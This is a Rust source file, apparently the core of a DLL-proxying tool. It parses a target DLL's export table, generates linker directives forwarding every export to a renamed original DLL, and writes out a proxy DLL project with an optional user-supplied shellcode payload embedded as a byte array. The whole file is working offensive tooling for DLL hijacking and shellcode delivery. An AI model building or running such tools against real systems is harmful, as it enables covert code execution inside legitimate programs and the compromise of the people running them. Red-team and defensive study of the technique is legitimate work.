use std::env;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::str;

pub mod pe_parser;


fn join_vec(nums: &[u8], sep: &str) -> String {
    let str_nums: Vec<String> = nums.iter() 
        .map(|n| n.to_string())  
        .collect(); 
    
    str_nums.join(sep)
}

fn main() -> std::io::Result<()> {
    let args: Vec<String> = env::args().collect();
    let file_path = &args[1];
    println!("Proxying {}", file_path);

    let shellcode = if args.len() >= 3 {
        let shellcode_path = &args[2];
        println!("Embedding shellcode {}", shellcode_path);

        match fs::read(shellcode_path) {
            Ok(r) => r,
            Err(_) => panic!("Could not find file {}", shellcode_path)
        }
    } else {
        println!("No shellcode argument given - skipping");
        Default::default()
    };

    let contents = match fs::read(file_path) {
        Ok(r) => r,
        Err(_) => panic!("Could not find file {}", file_path)
    };
    

    let path = std::path::Path::new(file_path);
    let file_name = path.file_name().unwrap().to_str().unwrap().replace(".dll", "");

    let pe_file = pe_parser::parse(contents);
    if pe_file.x64 {
        println!("Parsed an x64 PE file");
    } else {
        println!("Parsed an x86 PE file");
    }

    let export_table = pe_file.export_table;
    println!("Found {} exported functions", export_table.array_of_names.len());

    let mut function_exports = "".to_owned();
    for i in 0..export_table.array_of_names.len() {
        let function_export = format!("    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n", export_table.array_of_names[i], file_name, export_table.array_of_names[i], export_table.array_of_ordinals[i]);
        function_exports.push_str(&function_export);
    }

    let content_export_asm = fs::read_to_string(".\\export.rs")?;

    let export_asm = content_export_asm.replace("{}", function_exports.as_str());

    let contents = fs::read_to_string(".\\template.rs")?;

    fs::create_dir(".\\output")?;
    
    let mut file = File::create(".\\output\\proxy.rs")?;
    file.write_all(contents.replace("{}", export_asm.as_str()).as_bytes())?;

    println!("Wrote proxy dll template to .\\output\\proxy.rs");

    if shellcode.len() > 0 {
        let content_shellcode_template = fs::read_to_string(".\\shellcode_template.rs")?;

        let shellcode_str = join_vec(&shellcode, ",");

        let content_shellcode = content_shellcode_template.replace("{SIZE}", shellcode.len().to_string().as_str()).replace("{SHELLCODE}", shellcode_str.as_str());
        //shellcode.join(",");
        let mut file = File::create(".\\output\\shellcode.rs")?;
        file.write_all(content_shellcode.as_bytes())?;
        println!("Wrote shellcode to .\\output\\shellcode.rs");
    }

    fs::copy(".\\build.rs", ".\\output\\build.rs")?;
    fs::copy(".\\Cargo.toml", ".\\output\\Cargo.toml")?;

    Ok(())

}

